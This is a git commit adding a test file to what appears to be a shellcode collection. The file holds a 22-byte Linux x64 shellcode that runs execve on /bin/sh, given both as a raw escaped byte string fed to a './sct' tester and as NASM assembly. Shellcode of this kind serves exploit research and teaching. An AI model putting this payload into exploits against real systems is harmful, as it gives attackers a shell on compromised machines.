9901e87fb0fd2a20bd9a3b28ebf912125ab2d9c9
zTrix <i@ztrix.me>
2014-10-28 03:26:25 +0800

    add linux x64 exec bin/sh shellcode

---
+++ tests/linux-x64_exec-bin-sh_22B.s
@@ -0,0 +1,18 @@
+
+true :; ./sct '\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x5e\x0f\x05'; exit
+
+bits 64
+
+    push   0x3b
+    pop    rax
+    cdq
+    movabs rbx,0x68732f2f6e69622f
+
+    push   rdx
+    push   rbx
+    push   rsp
+    pop    rdi
+    push   rdx
+    pop    rsi
+    syscall
+
